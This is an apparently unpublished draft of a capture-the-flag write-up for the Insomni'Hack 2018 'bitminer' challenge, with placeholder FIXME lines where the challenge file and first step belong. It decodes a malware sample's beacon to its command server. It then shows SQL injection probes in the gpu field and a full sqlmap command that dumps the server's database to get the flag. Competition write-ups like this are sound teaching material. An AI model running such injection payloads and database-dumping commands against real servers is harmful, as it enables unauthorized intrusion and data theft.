---
title: Insomni'Hack 2018 - Vba02-bitminer
published: false
---

# {{page.title}}
Solves: 21 / Points: 142
## Challenge description
Oh no I opened an email attachment AGAIN!! Help me to take my revenge. Here is the file I downloaded:

FIXME: Add the file
## Challenge resolution
FIXME: first step

The following base64 is sent over HTTP to the C2 by the malware: eyJjaWQiOiJERVNLVE9QLUQwMjE0VjgiLCJjcHUiOiJJbnRlbChSKSBDb3JlKFRNKSBpNS00MzEwVSBDUFUgQCAyLjAwR0h6IiwiZ3B1IjoiQ2FydGUgdmlkw6lvIGRlIGJhc2UgTWljcm9zb2Z0In0=
The decoded base64 is a json object:
```
{
    "cid":"DESKTOP-D0214V8",
    "cpu":"Intel(R) Core(TM) i5-4310U CPU @ 2.00GHz",
    "gpu":"Carte vidéo de base Microsoft"
}
```
After playing with the json content, we identify that the server send an error when a single quote is present in the gpu field. The vulnerability seems to be a SQL injection which can be easily checked by sending the following gpu value:
* ' or 1=1 \-\- always true, return go
* ' or 1=0 \-\- always false, return pwaaa

As we are lazy hackers, we use sqlmap to extract the database content. To do so, we use the -r option by defining a file containing all information the request (* is used to mark the injection point):
```
$ cat raw_request
POST /?a=benchmark HTTP/1.1
Host: bitminer.insomni.hack
User-Agent: Bitcoin Mining $couter 0.1 Beta 1337
Expect: 100-continue
Content-Length: 148
Content-Type: application/x-www-form-urlencoded

*
```

And run the following sqlmap command:
``$ sqlmap -r raw_request --tamper base64encode --prefix $'{"cid":"DESKTOP-D0214V8","cpu":"Intel(R) Core(TM) i5-4310U CPU @ 2.00GHz","gpu":"\' or 1=1 ' --suffix ' -- a"}' --skip-urlencode --level 5 --string go --technique B --dump``

Finaly, we retrieve the flag from the flag tables: INS{M1ninG_i5_t0o_H4rD_Lets_D0_Norm4l_Cyb3rCr1me}


